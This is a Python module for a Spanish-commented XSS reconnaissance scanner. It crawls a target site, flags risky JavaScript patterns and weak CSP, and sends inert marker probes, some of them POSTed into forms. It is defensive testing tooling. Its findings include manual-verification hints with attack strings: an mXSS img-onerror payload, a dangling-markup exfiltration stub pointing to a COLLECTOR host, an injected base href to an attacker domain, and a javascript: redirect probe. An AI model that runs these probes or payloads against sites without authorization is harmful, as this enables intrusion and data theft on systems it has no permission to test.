"""
codexRC - XSSPro
"""

from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
import re
import json
import secrets
import time
import concurrent.futures

import requests
from bs4 import BeautifulSoup

from core.hunter_base import (
    Log, SKIP_EXT, JS_SINK_RE, JS_SOURCE_RE, JS_ENDPOINT_RE,
    FORM_INPUT_TYPES, _norm,
)

class XSSPro:
    """Bateria XSS-PRO (v0.20.0): seis vectores avanzados que el corpus basico
    no cubre. Filosofia identica al corpus: marcadores y analisis estatico,
    NUNCA payloads funcionales disparados contra el blanco.

      1) postmessage : listener de message sin check de origen con sink peligroso
      2) dyn_script  : carga dinamica de <script> con src influible (query/hash/URL)
      3) mxss        : sinks de re-serializacion (innerHTML = x.innerHTML) y
                       contenedores mutables (svg/math/noscript/template)
      4) dangling    : reflexion en atributo con comilla cruda -> markup colgante:
                       exfiltracion pasiva de contenido SIN ejecutar JS
                       (la via cuando CSP bloquea scripts)
      5) stored      : marcador POST que reaparece en otra pagina (XSS almacenado)
      6) csp_bypass  : politicas CSP debiles con vector de bypass concreto

    Los modulos 1-3 y 6 son solo lectura. El 5 escribe un marcador inerte
    (igual que BLIND): activar solo en programas que lo permitan o en labs.
    """

    MAX_TEXTS = 45        # paginas HTML + archivos JS escaneados (limite duro)
    MAX_PARAMS = 40
    MAX_FORMS = 10

    # ---- patrones estaticos ----
    PM_LISTENERS = re.compile(r'addEventListener\s*\(\s*["\']message["\']|\bonmessage\s*=', re.I)
    PM_SINKS = ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write",
                "eval(", "Function(", "srcdoc", "location.href", "location.assign",
                "location.replace", ".html(")
    PM_CHECKS = re.compile(r'\.origin|event\.origin|e\.origin|\.source\s*===|data\.origin', re.I)

    DS_CREATE = re.compile(r"createElement\s*\(\s*['\"]script", re.I)
    DS_GETSCRIPT = re.compile(r"getScript\s*\(", re.I)
    DS_TAINTS = ("location.search", "location.hash", "location.href", "document.URL",
                 "URLSearchParams", "getParameter", "document.referrer")

    MX_RESERIAL = re.compile(r"\.(?:innerHTML|outerHTML)\s*=\s*[\w$.]+\.(?:innerHTML|outerHTML)", re.I)
    MX_SINK = re.compile(r"\.(?:innerHTML|outerHTML|insertAdjacentHTML)\s*=", re.I)
    MX_CONTAINERS = ("<svg", "<math", "<noscript", "<template")

    # hosts con JSONP / librerias que permiten derivar JS si estan en script-src
    CSP_JSONP_HOSTS = ("googleapis.com", "gstatic.com", "google.com", "googleusercontent.com",
                       "recaptcha.net", "youtube.com", "ytimg.com", "jsdelivr.net",
                       "unpkg.com", "cdnjs.cloudflare.com", "vimeo.com", "twitter.com",
                       "bing.com", "cloudflare.com", "akamaihd.net", "doubleclick.net")

    def __init__(self, session: requests.Session, log: Log,
                 delay: float = 0.15, timeout: float = 15.0,
                 workers: int = 1):
        self.session = session
        self.log = log
        self.delay = delay
        self.timeout = timeout
        self.workers = max(1, min(int(workers or 1), 8))
        self.csp_inline_ok = None   # lo llena scan_csp_bypass para dangling

    def _pause(self) -> None:
        time.sleep(self.delay)

    def _parallel(self, fn, items):
        """OVERDRIVE: ver XSSHunter._parallel. workers=1 = clasico."""
        items = list(items)
        if self.workers <= 1 or len(items) <= 1:
            return [r for r in (fn(i) for i in items) if r]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as ex:
            return [r for r in ex.map(fn, items) if r]

    @staticmethod
    def _mark() -> str:
        return "kxp" + secrets.token_hex(4) + "z"

    def _finding(self, kind: str, target: str, param: str, gravedad: str,
                 razon: str, evidence: str, ctx: str = "-") -> Dict[str, Any]:
        return {
            "type": kind,
            "target": target,
            "param": param,
            "method": "estatico",
            "context": ctx,
            "severity": gravedad,
            "reason": razon,
            "evidence": evidence[:300],
            "veredicto": {
                "gravedad": gravedad,
                "primeros": "desconocido: revisar si ya esta reportado antes de enviar",
                "reglas": "OK: analisis estatico de codigo publico y sondas de "
                          "marcador, sin payloads funcionales",
            },
        }

    # ---------- recoleccion de texto (paginas + JS) ----------
    def _collect_texts(self, base_url: str, spider_out: Dict[str, Any]) -> List[Dict[str, str]]:
        out: List[Dict[str, str]] = []
        seen_js: set = set()
        pages = [base_url] + [p for p in spider_out.get("pages", []) if p != base_url]
        for page in pages[:self.MAX_TEXTS]:
            if len(out) >= self.MAX_TEXTS:
                break
            self._pause()
            try:
                r = self.session.get(urljoin(base_url, page), timeout=self.timeout)
            except Exception:
                continue
            if r.status_code != 200 or "html" not in (r.headers.get("Content-Type") or ""):
                continue
            out.append({"kind": "html", "origin": page, "text": r.text})
            for src in re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text)[:5]:
                js = urljoin(page, src)
                if js in seen_js or len(out) >= self.MAX_TEXTS:
                    continue
                seen_js.add(js)
                self._pause()
                try:
                    jr = self.session.get(js, timeout=self.timeout)
                    if jr.status_code == 200 and len(jr.text) < 400_000:
                        out.append({"kind": "js", "origin": js, "text": jr.text})
                except Exception:
                    pass
        for js in spider_out.get("js_files", [])[:self.MAX_TEXTS - len(out)]:
            if js in seen_js:
                continue
            seen_js.add(js)
            self._pause()
            try:
                jr = self.session.get(js, timeout=self.timeout)
                if jr.status_code == 200 and len(jr.text) < 400_000:
                    out.append({"kind": "js", "origin": js, "text": jr.text})
            except Exception:
                pass
        return out

    # ---------- 1) postMessage XSS ----------
    def scan_postmessage(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.PM_LISTENERS.finditer(t["text"]):
                win = t["text"][m.start(): m.start() + 1500]
                sinks = [s for s in self.PM_SINKS if s.lower() in win.lower()]
                if not sinks:
                    continue
                # FP-GUARD core-js: el scheduler de microtareas de core-js
                # instala addEventListener("message") propio (polyfill de
                # postMessage/MessageChannel). No acepta mensajes externos.
                # Validado en Next.js 16 (xenpaid) tras verificacion dinamica.
                _alrededor = t["text"][max(0, m.start() - 3000): m.start() + 3000]
                if sinks == ["Function("] and any(
                        _sig in _alrededor for _sig in
                        (".port1.onmessage", "MessageChannel", 'Function("return this")')):
                    continue
                line = t["text"].count("\n", 0, m.start()) + 1
                checked = bool(self.PM_CHECKS.search(win))
                ev = (f"{t['origin']} (linea {line}) listener message -> "
                      f"{', '.join(sinks[:3])}")
                if checked:
                    findings.append(self._finding(
                        "postmessage-xss", t["origin"], "-", "media",
                        "listener de message con sink peligroso y chequeo de origen "
                        "cercano: auditar a mano si el chequeo es bypasseable "
                        "(comparacion con null, por prefijo, o ausente en un handler)",
                        ev, "js"))
                else:
                    findings.append(self._finding(
                        "postmessage-xss", t["origin"], "-", "alta",
                        "listener de message SIN chequeo de origen escribe en sink "
                        "peligroso: cualquier pagina (o ventana hija) puede hacer "
                        "postMessage y ejecutar en este contexto",
                        ev, "js"))
                    self.log(f"[xsspro] 💥 postMessage sin origen -> {', '.join(sinks[:2])} "
                             f"en {urlparse(t['origin']).path}")
        return findings

    # ---------- 2) carga dinamica de script ----------
    def scan_dyn_script(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            text = t["text"]
            hits = list(self.DS_CREATE.finditer(text)) + list(self.DS_GETSCRIPT.finditer(text))
            for m in hits:
                win = text[max(0, m.start() - 800): m.start() + 1200]
                tainted = any(tap in win for tap in self.DS_TAINTS)
                has_src = ".src" in win or "getScript" in win
                if not (tainted or has_src):
                    continue
                line = text.count("\n", 0, m.start()) + 1
                ev = f"{t['origin']} (linea {line}) {m.group(0)} + src dinamico"
                if tainted:
                    findings.append(self._finding(
                        "dyn-script", t["origin"], "-", "alta",
                        "script creado con createElement/getScript y su src depende de "
                        "datos de la URL (query/hash): un atacante controla la fuente "
                        "del script inyectando ?param=//malvado/x.js",
                        ev, "js"))
                    self.log(f"[xsspro] 💥 carga dinamica influible en "
                             f"{urlparse(t['origin']).path}")
                else:
                    findings.append(self._finding(
                        "dyn-script", t["origin"], "-", "info",
                        "carga dinamica de script presente: verificar a mano si el src "
                        "puede ser influido por datos del usuario",
                        ev, "js"))
        return findings

    # ---------- 3) mXSS ----------
    def scan_mxss(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            text = t["text"]
            for m in self.MX_RESERIAL.finditer(text):
                line = text.count("\n", 0, m.start()) + 1
                findings.append(self._finding(
                    "mxss", t["origin"], "-", "alta",
                    "re-serializacion: x.innerHTML = y.innerHTML re-parsea el HTML; "
                    "payloads que mutan al re-serializar (noscript/svg/math) ejecutan "
                    "aunque el filtro del servidor limpio el original",
                    f"{t['origin']} (linea {line}) {m.group(0)} · verificacion manual: "
                    "insertar <noscript><p title=\"</noscript><img src=x onerror=...>\">",
                    "js"))
                self.log(f"[xsspro] 💥 sink de re-serializacion (mXSS) en "
                         f"{urlparse(t['origin']).path}")
            if t["kind"] == "html" and self.MX_SINK.search(text):
                low = text.lower()
                mut = [c for c in self.MX_CONTAINERS if c in low]
                if mut:
                    findings.append(self._finding(
                        "mxss", t["origin"], "-", "media",
                        f"sink innerHTML en pagina con contenedor mutable {mut[0]}: "
                        "el parser cambia de contexto dentro de estos elementos; "
                        "candidato mXSS que evita filtros de sanitizacion",
                        f"{t['origin']} sink innerHTML + {mut[0]}",
                        "html"))
        return findings

    # ---------- 4) dangling markup ----------
    def _attr_ctx(self, text: str, mark: str) -> Optional[str]:
        i = text.find(mark)
        if i < 0:
            return None
        pre = text[max(0, i - 60):i]
        m = re.search(r"=\s*([\"'])[^\"']*$", pre)
        if m:
            return "attr-dq" if m.group(1) == '"' else "attr-sq"
        if re.search(r"=\s*$", pre):
            return "attr-unquoted"
        return None

    def _probe_param(self, url: str, param: str, value: str) -> Optional[requests.Response]:
        self._pause()
        try:
            parts = urlparse(url)
            q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
            q.append((param, value))
            return self.session.get(urlunparse(parts._replace(query=urlencode(q))),
                                    timeout=self.timeout)
        except Exception:
            return None

    def _probe_dangling_target(self, tgt) -> List[Dict[str, Any]]:
        """Sonda de UN objetivo (unidad de trabajo OVERDRIVE)."""
        findings: List[Dict[str, Any]] = []
        url, param = tgt["url"], tgt["param"]
        mark = self._mark()
        r = self._probe_param(url, param, mark)
        if r is None or mark not in r.text:
            return findings
        ctx = self._attr_ctx(r.text, mark)
        if ctx not in ("attr-dq", "attr-sq", "attr-unquoted"):
            return findings
        quote = '"' if ctx == "attr-dq" else ("'" if ctx == "attr-sq" else "")
        raw = self._probe_param(url, param, mark + quote + "<")
        if raw is None or mark not in raw.text:
            return findings
        after = raw.text[raw.text.find(mark):
                         raw.text.find(mark) + len(mark) + 3]
        ok_q = quote != "" and quote in after
        ok_lt = "<" in after
        if not (ok_q or (ctx == "attr-unquoted" and ok_lt)):
            return findings
        gravedad = "alta" if (self.csp_inline_ok is False) else "media"
        razon = ("reflexion dentro de atributo con comilla cruda: se puede abrir "
                 "un atributo sin cerrar que traga el resto del HTML hasta la "
                 "proxima comila y exfiltrarlo de forma PASIVA, sin ejecutar JS")
        if self.csp_inline_ok is False:
            razon += ("; la CSP del sitio bloquea JS inline, y el markup colgante "
                      "NO depende de script-src: es la via de exfiltracion")
        ev = (f"{urlparse(url).path}?{param}= · contexto {ctx} · comilla+< crudos · "
              "marcador de verificacion manual: <img src='https://COLLECTOR/c?d=")
        findings.append(self._finding("dangling-markup", url, param,
                                      gravedad, razon, ev, ctx))
        self.log(f"[xsspro] 💥 dangling markup posible en {param} "
                 f"({ctx}) @ {urlparse(url).path}")
        return findings

    def probe_dangling(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        tgts = param_targets[:self.MAX_PARAMS]
        res = self._parallel(self._probe_dangling_target, tgts)
        return [f for sub in res for f in (sub or [])]

    # ---------- 5) XSS almacenado ----------
    def probe_stored(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        forms = spider_out.get("forms", [])[:self.MAX_FORMS]
        pages = spider_out.get("pages", [])[:30]
        if not forms:
            return findings
        self.log("[xsspro] stored: siembra marcadores inertes (POST) y busca "
                 "donde reaparecen")
        for form in forms:
            fields = [f for f in form.get("fields", [])[:8]]
            if not fields:
                continue
            mark = self._mark()
            field = max(fields, key=len)
            data = {x: "x" for x in fields}
            data[field] = mark
            self._pause()
            try:
                if form["method"].upper() == "POST":
                    self.session.post(form["url"], data=data, timeout=self.timeout)
                else:
                    self.session.get(form["url"], params=data, timeout=self.timeout)
            except Exception:
                continue
            for page in pages:
                if page == form["url"]:
                    continue
                self._pause()
                try:
                    r = self.session.get(urljoin(spider_out.get("base_url", ""), page),
                                         timeout=self.timeout)
                except Exception:
                    continue
                if mark in r.text:
                    findings.append(self._finding(
                        "stored-xss", page, field, "alta",
                        "el marcador enviado por formulario reaparece en otra pagina: "
                        "reflexion ALMACENADA; si los caracteres crudos sobreviven en "
                        "la vista de almacenamiento es XSS almacenado completo",
                        f"{mark[:14]}... enviado en '{field}' -> reaparece en "
                        f"{urlparse(page).path}", "stored"))
                    self.log(f"[xsspro] 💥 marcador almacenado: '{field}' se "
                             f"re-renderiza en {urlparse(page).path}")
                    break
        return findings

    # ---------- 6) CSP bypass ----------
    def scan_csp_bypass(self, base_url: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        try:
            self._pause()
            r = self.session.get(base_url, timeout=self.timeout)
            policy = r.headers.get("Content-Security-Policy", "") or \
                     r.headers.get("Content-Security-Policy-Report-Only", "")
        except Exception:
            return findings
        if not policy:
            self.csp_inline_ok = True
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "info",
                "el sitio no envia CSP: cualquier XSS reflejado/almacenado ejecuta "
                "sin necesitar bypass", "sin header Content-Security-Policy", "header"))
            return findings
        dirs: Dict[str, List[str]] = {}
        for part in policy.split(";"):
            toks = part.split()
            if toks:
                dirs[toks[0].lower()] = toks[1:]
        script = dirs.get("script-src") or dirs.get("default-src") or []
        self.csp_inline_ok = "'unsafe-inline'" in " ".join(script)
        ev = policy[:200]

        if self.csp_inline_ok:
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "alta",
                "script-src permite 'unsafe-inline': la CSP NO detiene scripts "
                "inyectados; cualquier XSS en la pagina ejecuta directo, la CSP es "
                "decorativa", ev, "header"))
        jsonp = [h for h in self.CSP_JSONP_HOSTS
                 if any(h in s for s in script if not s.startswith("'"))]
        if jsonp:
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "media",
                f"script-src permite {jsonp[0]}: hosts con endpoints JSONP o "
                "librerias derivables permiten cargar JS desde el dominio "
                "permitido (bypass clasico de allowlist)", ev, "header"))
        if "'strict-dynamic'" in " ".join(script):
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "info",
                "'strict-dynamic': si existe UN XSS, los scripts que este crea pueden "
                "cargar mas scripts ignorando nonce/hash (proteccion perforable)",
                ev, "header"))
        all_srcs = dirs.get("default-src") or []
        self.csp_base_missing = "base-uri" not in dirs
        if ("object-src" not in dirs and "object-src" not in
                " ".join(all_srcs) and not self.csp_inline_ok):
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "media",
                "sin object-src: plugins <object>/<embed> no estan restringidos "
                "(vector historico cuando script-src es estricto)", ev, "header"))
        if "base-uri" not in dirs:
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "media",
                "sin base-uri: un <base href> inyectado secuestra URLs relativas "
                "del sitio (forms y links apuntan al dominio del atacante)",
                ev, "header"))
        if any(s in ("*", "https:") for s in script):
            findings.append(self._finding(
                "csp-bypass", base_url, "-", "alta",
                "script-src con wildcard o https: : la CSP no restringe el origen "
                "de scripts en la practica", ev, "header"))
        return findings

    # ---------- 7) DOM clobbering ----------
    CB_PATTERNS = (
        (re.compile(r"eval\s*\(\s*window\.", re.I), "alta",
         "eval de una propiedad de window: clobberable con id/name de elemento"),
        (re.compile(r"document\.querySelector\s*\(\s*['\"]#['\"]\s*\+", re.I), "media",
         "selector de id armado por concatenacion: un elemento con ese id cloberea la referencia"),
        (re.compile(r"window\s*\[", re.I), "media",
         "acceso dinamico a window[...]: clobberable con id/name de elemento"),
        (re.compile(r"\.(?:innerHTML|src|href)\s*=[^;]{0,60}window\.(?!location)", re.I), "media",
         "sink alimentado por una propiedad global de window clobberable con <div id=...>"),
    )
    WN_PAT = re.compile(r"window\.name", re.I)

    def scan_clobbering(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for pat, sev, razon in self.CB_PATTERNS:
                for m in pat.finditer(t["text"]):
                    line = t["text"].count("\n", 0, m.start()) + 1
                    findings.append(self._finding(
                        "dom-clobbering", t["origin"], "-", sev, razon,
                        f"{t['origin']} (linea {line}) {m.group(0)[:50]} · "
                        "verificacion manual: <div id=propiedad> para secuestrar la referencia",
                        "js"))
                    self.log(f"[xsspro] 💥 clobbering: {razon[:40]} @ "
                             f"{urlparse(t['origin']).path}")
            for m in self.WN_PAT.finditer(t["text"]):
                win = t["text"][m.start(): m.start() + 300]
                if any(s in win for s in ("innerHTML", "src", "href", "eval", "Function")):
                    line = t["text"].count("\n", 0, m.start()) + 1
                    findings.append(self._finding(
                        "dom-clobbering", t["origin"], "-", "alta",
                        "window.name alimentando un sink: cualquier pagina que "
                        "abra esta en iframe puede fijar window.name del blanco",
                        f"{t['origin']} (linea {line}) window.name -> sink", "js"))
        return findings

    # ---------- 8) prototype pollution ----------
    PP_SINKS = re.compile(r"Object\.assign\s*\(|\$\.extend\(\s*true|\bmerge\s*\(|deepMerge", re.I)
    TAINTS = ("JSON.parse", "location.search", "location.hash", "URLSearchParams",
              "document.cookie", "getParameter")

    def scan_proto(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.PP_SINKS.finditer(t["text"]):
                # FP-GUARD webpack/turbopack: Object.assign(r.default,r) es el
                # interop estandar de modulos ES al cargar el bundle; los
                # TAINTS de modulos vecinos en el mismo chunk no lo alcanzan.
                if re.search(r"Object\.assign\(\s*\w+\.default\s*,",
                             t["text"][m.start():m.start() + 60]):
                    continue
                win = t["text"][max(0, m.start() - 600): m.start() + 800]
                line = t["text"].count("\n", 0, m.start()) + 1
                if any(x in win for x in self.TAINTS):
                    findings.append(self._finding(
                        "proto-pollution", t["origin"], "-", "alta",
                        "merge/assign de datos de la URL sin saneo: candidate a "
                        "prototype pollution (__proto__/constructor) que luego "
                        "alimenta sinks (XSS, bypass de validaciones)",
                        f"{t['origin']} (linea {line}) {m.group(0)[:40]} + taint de URL",
                        "js"))
                    self.log(f"[xsspro] 💥 prototype pollution candidate en "
                             f"{urlparse(t['origin']).path}")
        return findings

    # ---------- 9) iframe srcdoc ----------
    IF_PAT = re.compile(r"(?:srcdoc|iframe\s*\.\s*src)\s*=", re.I)

    def scan_iframe(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.IF_PAT.finditer(t["text"]):
                win = t["text"][max(0, m.start() - 600): m.start() + 600]
                line = t["text"].count("\n", 0, m.start()) + 1
                if any(x in win for x in self.TAINTS):
                    findings.append(self._finding(
                        "iframe-srcdoc", t["origin"], "-", "alta",
                        "iframe con srcdoc/src construido con datos de la URL: "
                        "HTML inyectado ejecuta dentro del iframe con el origen "
                        "del propio sitio",
                        f"{t['origin']} (linea {line}) {m.group(0)[:40]} + taint", "js"))
                    self.log(f"[xsspro] 💥 iframe srcdoc/src influible en "
                             f"{urlparse(t['origin']).path}")
        return findings

    # ---------- 10) base tag injection ----------
    def probe_base(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for tgt in param_targets[:self.MAX_PARAMS]:
            url, param = tgt["url"], tgt["param"]
            mark = self._mark()
            r = self._probe_param(url, param, mark)
            if r is None or mark not in r.text:
                continue
            raw = self._probe_param(url, param, mark + "<'")
            if raw is None or mark not in raw.text:
                continue
            after = raw.text[raw.text.find(mark): raw.text.find(mark) + len(mark) + 3]
            if "<" not in after:
                continue
            idx = raw.text.find(mark)
            head_end = raw.text.lower().find("</head>")
            if 0 <= idx < head_end if head_end > 0 else (idx < 600):
                gravedad, donde = "alta", "dentro de <head>"
            elif getattr(self, "csp_base_missing", True):
                gravedad, donde = "media", "sin base-uri en CSP"
            else:
                continue
            findings.append(self._finding(
                "base-tag", url, param, gravedad,
                f"reflexion con < crudo {donde}: un <base href=//atacante> "
                "secuestra todas las URLs relativas del sitio (forms y links "
                "apuntan al dominio del atacante)",
                f"{urlparse(url).path}?{param}= · < crudo en HTML", "body"))
            self.log(f"[xsspro] 💥 base tag injection @ {urlparse(url).path}?{param}")
        return findings

    # ---------- 11) open redirect -> XSS ----------
    REDIR_PARAMS = ("url", "redirect", "redirect_uri", "next", "return", "returnto",
                    "r", "continue", "dest", "destination", "target", "goto", "out", "link")

    def _probe_redir_target(self, tgt) -> List[Dict[str, Any]]:
        """Sonda de UN objetivo (unidad de trabajo OVERDRIVE)."""
        findings: List[Dict[str, Any]] = []
        url, param = tgt["url"], tgt["param"]
        if param.lower() not in self.REDIR_PARAMS:
            return findings
        mark = self._mark()

        def _probe_redir(url: str, param: str, value: str):
            self._pause()
            try:
                parts = urlparse(url)
                q = [(k, v) for k, v in parse_qsl(parts.query) if k != param]
                q.append((param, value))
                # NO seguir el redirect: el dato esta en la cabecera Location
                return self.session.get(
                    urlunparse(parts._replace(query=urlencode(q))),
                    timeout=self.timeout, allow_redirects=False)
            except Exception:
                return None

        r = _probe_redir(url, param, "https://example.org/" + mark)
        loc = (r.headers.get("Location", "") if r is not None else "")
        if r is None or mark not in loc:
            return findings
        findings.append(self._finding(
            "open-redirect", url, param, "media",
            "el parametro controla la cabecera Location: open redirect "
            "(phishing, bypass de allowlists, token leak por referrer)",
            f"Location -> {loc[:100]}", "header"))
        self.log(f"[xsspro] 💥 open redirect en '{param}' @ {urlparse(url).path}")
        r2 = _probe_redir(url, param, "javascript:" + mark)
        loc2 = (r2.headers.get("Location", "") if r2 is not None else "")
        if r2 is not None and mark in loc2:
            findings.append(self._finding(
                "open-redirect-xss", url, param, "alta",
                "el redirect acepta javascript: en Location: si un usuario "
                "clickea el link resultante ejecuta JS en el origen del sitio",
                f"Location -> {loc2[:100]}", "header"))
        return findings

    def probe_open_redirect(self, param_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        tgts = param_targets[:self.MAX_PARAMS]
        res = self._parallel(self._probe_redir_target, tgts)
        return [f for sub in res for f in (sub or [])]

    # ---------- 12) reflexion en la ruta ----------
    def probe_path_reflection(self, base_url: str) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        mark = self._mark()
        self._pause()
        try:
            r = self.session.get(urljoin(base_url, "/" + mark), timeout=self.timeout)
        except Exception:
            return findings
        if mark not in r.text:
            return findings
        raw_mark = mark + "<'"
        self._pause()
        try:
            r2 = self.session.get(urljoin(base_url, "/" + raw_mark), timeout=self.timeout)
        except Exception:
            r2 = None
        escapa = r2 is not None and mark in r2.text and "<" in \
            r2.text[r2.text.find(mark): r2.text.find(mark) + len(mark) + 3]
        findings.append(self._finding(
            "path-reflection", base_url, "(ruta)", "alta" if escapa else "media",
            "la RUTA se refleja en la respuesta (404/rewrite): contexto de "
            "inyeccion que el corpus de parametros no cubre"
            + ("; < crudo sobrevive: XSS en la ruta factible" if escapa else ""),
            f"GET /{mark[:12]}... -> reflejado · HTTP {r.status_code}", "path"))
        self.log(f"[xsspro] 💥 reflexion en la ruta @ {urlparse(base_url).netloc}")
        return findings

    # ---------- 13) fingerprint de sanitizador ----------
    SAN_LIBS = (
        (re.compile(r"DOMPurify", re.I), "DOMPurify", (2, 4),
         "versiones < 2.4 tienen bypasses mXSS publicos (CVE-2024-45816, etc.)"),
        (re.compile(r"sanitize-html|sanitizeHtml", re.I), "sanitize-html", (2, 12), ""),
        (re.compile(r"js-xss|\bnew\s+FilterXSS|\bxss\s*\(", re.I), "js-xss", (1, 0), ""),
    )
    SAN_VER = re.compile(r"version\s*[:=]\s*['\"]?(\d+(?:\.\d+)+)", re.I)

    @staticmethod
    def _vtuple(v: str) -> tuple:
        return tuple(int(x) for x in v.split(".")[:3])

    def scan_sanitizers(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for pat, name, minv, extra in self.SAN_LIBS:
                if not pat.search(t["text"]):
                    continue
                ver = None
                for vm in self.SAN_VER.finditer(t["text"]):
                    ver = vm.group(1)
                    break
                if ver and self._vtuple(ver) < minv:
                    findings.append(self._finding(
                        "sanitizer", t["origin"], ver, "alta",
                        f"sanitizer {name} VIEJO (v{ver}): {extra or 'bypasses conocidos en versiones antiguas'}; "
                        "validar contra el payload mXSS correspondiente",
                        f"{t['origin']} {name} v{ver}", "js"))
                    self.log(f"[xsspro] 💥 {name} v{ver} viejo en "
                             f"{urlparse(t['origin']).path}")
                elif ver:
                    findings.append(self._finding(
                        "sanitizer", t["origin"], ver, "info",
                        f"sanitizer {name} v{ver} presente: filtro activo, "
                        "probar vectores mXSS de re-serializacion antes de descartar",
                        f"{t['origin']} {name} v{ver}", "js"))
        return findings

    # ---------- 14) self-XSS escalable ----------
    SELF_WORDS = ("profile", "user", "account", "settings", "comment",
                  "name", "bio", "note", "post", "message")

    def probe_self_xss(self, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for form in spider_out.get("forms", [])[:self.MAX_FORMS]:
            action = form.get("url", "")
            if not any(w in action.lower() for w in self.SELF_WORDS):
                continue
            fields = [f for f in form.get("fields", [])[:8]]
            if not fields:
                continue
            mark = self._mark()
            field = max(fields, key=len)
            data = {x: "x" for x in fields}
            data[field] = mark
            self._pause()
            try:
                if form["method"].upper() == "POST":
                    r = self.session.post(action, data=data, timeout=self.timeout)
                else:
                    r = self.session.get(action, params=data, timeout=self.timeout)
            except Exception:
                continue
            if r.status_code == 200 and mark in r.text:
                findings.append(self._finding(
                    "self-xss", action, field, "media",
                    "el input persiste y se re-renderiza al propio usuario: "
                    "self-XSS; ESCALABLE si otra vista (admin, lista publica, "
                    "email) renderiza el mismo dato, ahi es XSS almacenado",
                    f"'{field}' -> re-renderizado en {urlparse(action).path}", "stored"))
                self.log(f"[xsspro] 💥 self-XSS persistente en '{field}' @ "
                         f"{urlparse(action).path}")
        return findings

    # ---------- 15) cookie/JSON a sink ----------
    CK_PAT = re.compile(r"document\.cookie", re.I)
    CK_SINKS = ("innerHTML", "insertAdjacentHTML", "outerHTML", ".src =", ".href =",
                "eval(", "Function(", "document.write")

    def scan_cookie_sink(self, texts: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for t in texts:
            for m in self.CK_PAT.finditer(t["text"]):
                win = t["text"][m.start(): m.start() + 500]
                if any(s.lower() in win.lower() for s in self.CK_SINKS):
                    line = t["text"].count("\n", 0, m.start()) + 1
                    findings.append(self._finding(
                        "cookie-sink", t["origin"], "-", "alta",
                        "document.cookie alimentando un sink de HTML: una cookie "
                        "inyectable (via response de otro subdominio o cabecera "
                        "CRLF) ejecuta en esta pagina",
                        f"{t['origin']} (linea {line}) document.cookie -> sink", "js"))
                    self.log(f"[xsspro] 💥 document.cookie -> sink en "
                             f"{urlparse(t['origin']).path}")
        return findings

    # ---------- orquestador ----------
    def run(self, base_url: str, spider_out: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        self.log("[xsspro] === bateria XSS-PRO: 6 vectores avanzados "
                 "(postMessage / dyn-script / mXSS / dangling / stored / CSP) ===")
        texts = self._collect_texts(base_url, spider_out)
        self.log(f"[xsspro] textos recolectados: {len(texts)} (paginas+js)")
        findings += self.scan_postmessage(texts)
        findings += self.scan_dyn_script(texts)
        findings += self.scan_mxss(texts)
        findings += self.scan_csp_bypass(base_url)
        findings += self.probe_dangling(spider_out.get("param_targets", []))
        findings += self.probe_stored(spider_out)
        # XSS-PRO 2: clobbering, proto-pollution, iframe, base tag, redirect,
        # path, sanitizers, self-XSS, cookie sink
        findings += self.scan_clobbering(texts)
        findings += self.scan_proto(texts)
        findings += self.scan_iframe(texts)
        findings += self.probe_base(spider_out.get("param_targets", []))
        findings += self.probe_open_redirect(spider_out.get("param_targets", []))
        findings += self.probe_path_reflection(base_url)
        findings += self.scan_sanitizers(texts)
        findings += self.probe_self_xss(spider_out)
        findings += self.scan_cookie_sink(texts)
        altas = len([f for f in findings if f["severity"] == "alta"])
        self.log(f"[xsspro] ══ XSS-PRO terminado: {len(findings)} hallazgos "
                 f"({altas} altos) · 15 modulos / arsenal total: 20 vectores XSS")
        return findings
